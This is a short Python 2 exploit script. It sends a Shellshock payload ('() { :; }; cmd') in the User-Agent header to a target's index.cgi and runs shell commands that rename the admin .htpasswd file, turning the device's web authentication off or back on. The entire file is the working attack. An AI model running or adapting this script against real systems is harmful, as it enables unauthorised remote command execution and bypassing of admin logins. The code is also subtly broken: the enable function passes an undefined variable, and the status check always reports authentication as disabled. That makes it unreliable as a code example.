#!/usr/bin/python2
import requests
import sys

def exec_cmd(target, cmd):
    url = "https://%s/index.cgi" %(target)
    headers = {'User-Agent': '() { :; }; %s' %(cmd)}
    try:
        requests.get(url=url, headers=headers, verify=False)
    except Exception, e:
        print e
        sys.exit("{!} Exception! Bailing!")

def enable(target):
    print "{*} Enabling Authentication..."
    enable_cmd = "mv /rw/admin/htpw /rw/admin/.htpasswd"
    exec_cmd(target=target, cmd=disable_cmd)
    auth_state = check_auth(target)
    if auth_state == 1:
        print "{+} Authentication Enabled!"
    if auth_state == 0:
        print "{-} Enabling Authentication Failed!"

def disable(target):
    # disable auth, validate disablement...
    print "(*) Disabling Authentication..."
    disable_cmd = "mv /rw/admin/.htpasswd /rw/admin/htpw"
    exec_cmd(target=target, cmd=disable_cmd)
    auth_state = check_auth(target)
    if auth_state == 1:
        print "{-} Disabling Authentication Failed!"
    elif auth_state == 0:
        print "{+} Authentication Disabled!"

def check_auth(target):
    # return 1 for enabled auth, 0 for disabled auth.
    check_url = "https://%s/admin/configurator" %(target)
    try:
        test = requests.get(url=check_url, verify=False)
    except Exception, e:
        print "{!} Exception hit! Printing stack trace..."
        print e
    try:
        if test.status_code == 200 or 301:
            return 0
        elif test.status_code == 401:
            return 1
    except Exception, e:
        print "{!} Exception hit! Printing stack trace..."
        print e

def main(args):
    if len(args) != 3:
        sys.exit("%s <target> <enable | disable>" %(args[0]))
    print "{+} Target: %s" %(args[1])
    if args[2] == "enable":
        enable(target=args[1])
    elif args[2] == "disable":
        disable(target=args[1])
    else:
        sys.exit("lolwut? read the fucking usage again")

if __name__ == "__main__":
    main(args=sys.argv)
